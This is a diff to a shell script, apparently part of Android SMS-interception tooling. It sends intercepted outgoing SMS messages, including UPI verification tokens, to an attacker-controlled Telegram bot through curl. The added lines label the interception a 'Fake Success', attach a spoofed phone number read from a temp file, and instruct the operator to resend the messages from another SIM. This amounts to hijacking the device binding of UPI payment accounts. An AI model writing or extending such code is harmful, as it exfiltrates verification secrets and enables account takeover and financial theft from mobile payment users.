@@ -206,13 +206,26 @@ forward_blocked_telegram() {
   TOKEN=$(grep '"telegram_bot_token"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   CHAT=$(grep '"telegram_chat_id"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
   [ -z "$TOKEN" ] || [ -z "$CHAT" ] && return 0
-  TEXT="📱 Intercepted Outgoing SMS
+  TEXT="📱 Verify SMS Blocked — Fake Success ✅
 @hivirtus @liqdy
 
-To: ${DEST}
+App: UPI Verify
+Real SIM: blocked
 
-Body:
+To (short code):
+${DEST}
+
+Body / Token:
 ${BODY}"
+  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
+  if [ -n "$SPOOF" ]; then
+    TEXT="${TEXT}
+
+Send FROM (app login / 2nd SIM):
+${SPOOF}
+
+Messages se isi number wali SIM se manually bhejo"
+  fi
   if command -v curl >/dev/null 2>&1; then
     curl -s -m 20 -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
       --data-urlencode "chat_id=${CHAT}" \
